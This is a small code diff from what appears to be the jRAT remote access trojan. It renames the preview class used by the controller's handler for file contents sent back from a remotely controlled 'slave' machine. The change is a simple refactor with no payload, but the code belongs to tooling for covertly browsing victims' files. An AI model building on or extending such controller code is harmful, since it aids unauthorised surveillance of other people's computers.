@@ -3,7 +3,7 @@ package jrat.module.fs.packets;
 import jrat.controller.Slave;
 import jrat.controller.packets.incoming.AbstractIncomingPacket;
 import jrat.module.fs.ui.FrameRemoteFiles;
-import jrat.module.fs.ui.previews.FramePreviewFile;
+import jrat.module.fs.ui.previews.PanelPreviewFile;
 
 
 public class Packet42PreviewFile extends AbstractIncomingPacket {
@@ -16,7 +16,7 @@ public class Packet42PreviewFile extends AbstractIncomingPacket {
         FrameRemoteFiles panel = (FrameRemoteFiles) slave.getPanel(FrameRemoteFiles.class);
 
 		if (panel != null) {
-            FramePreviewFile handler = (FramePreviewFile) panel.getPreviewHandler(file);
+            PanelPreviewFile handler = (PanelPreviewFile) panel.getPreviewHandler(file);
 
             if (handler != null) {
                 handler.addData(content);
